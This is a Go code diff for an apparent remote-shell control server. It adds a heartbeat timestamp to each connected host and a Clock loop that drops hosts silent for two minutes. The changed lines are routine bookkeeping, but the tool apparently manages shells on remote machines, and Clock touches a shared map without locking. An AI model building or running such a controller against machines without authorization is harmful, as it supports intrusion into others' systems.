@@ -87,6 +87,7 @@ func doServerStuff(conn net.Conn) {
 							ip:          sp[0],
 							intIp:       conn.RemoteAddr().String()[:strings.Index(conn.RemoteAddr().String(), ":")],
 							hostName:    sp[3],
+							ttl:		time.Now(),
 							shellInChan: make(chan string),
 						}
 						serverMap[conn] = &newS
@@ -99,6 +100,7 @@ func doServerStuff(conn net.Conn) {
 							ip:          "unknown",
 							intIp:       conn.RemoteAddr().String()[:strings.Index(conn.RemoteAddr().String(), ":")],
 							hostName:    "unknown",
+							ttl:		time.Now(),
 							shellInChan: make(chan string),
 						}
 						serverMap[conn] = &newS
@@ -146,6 +148,7 @@ func doServerStuff(conn net.Conn) {
 									ip:          sp[0],
 									intIp:       conn.RemoteAddr().String()[:strings.Index(conn.RemoteAddr().String(), ":")],
 									hostName:    sp[3],
+									ttl:		time.Now(),
 									shellInChan: make(chan string),
 								}
 								serverMap[conn] = &newS
@@ -158,6 +161,7 @@ func doServerStuff(conn net.Conn) {
 									ip:          "unknown",
 									intIp:       conn.RemoteAddr().String()[:strings.Index(conn.RemoteAddr().String(), ":")],
 									hostName:    "unknown",
+									ttl:time.Now(),
 									shellInChan: make(chan string),
 								}
 								serverMap[conn] = &newS
@@ -175,9 +179,13 @@ func doServerStuff(conn net.Conn) {
 			if err != nil {
 				fmt.Println("Error reading Code:", l, err.Error())
 				_ = conn.Close()
-				offlineMsg := fmt.Sprintf("remove|%s|%s", serverMap[conn].uuid, serverMap[conn].intIp)
-				Broadcast(offlineMsg)
-				delete(serverMap, conn) //因为这个不是第一次，所以conn肯定会在表里，得删除
+
+				if _, ok := serverMap[conn]; ok {
+					// 判断是否在表里，因为也许被Clock给杀了
+					offlineMsg := fmt.Sprintf("remove|%s|%s", serverMap[conn].uuid, serverMap[conn].intIp)
+					Broadcast(offlineMsg)
+					delete(serverMap, conn) //因为这个不是第一次，所以conn肯定会在表里，得删除
+				}
 				return
 			}
 			var msg = *(**MSG)(unsafe.Pointer(&buf))
@@ -303,7 +311,9 @@ func tlShellHandle(conn net.Conn){
 func Handle(conn net.Conn, code int) {
 	switch code {
 	case SERVER_HEARTS:
-		fmt.Println("Recv Hearts Packet.")
+
+		s := serverMap[conn]
+		s.ttl = time.Now()
 		return
 	case SERVER_SHELL:
 		msg := tlLoadMsg(SERVER_SHELL, 0)
@@ -377,5 +387,21 @@ func Generate(domain string,port string,version int)string  {
 		return ""
 	}
 	return Name
+
+}
+
+func Clock(){
+	for{
+		for conn,s := range serverMap{
+			if time.Now().Sub(s.ttl) > time.Minute * 2 {
+				_ = conn.Close()
+				fmt.Println(s.ip+".....Kill")
+				offlineMsg := fmt.Sprintf("remove|%s|%s", serverMap[conn].uuid, serverMap[conn].intIp)
+				Broadcast(offlineMsg)
+				delete(serverMap, conn)
+			}
+		}
+		time.Sleep(time.Second * 2)
+	}
 
 }
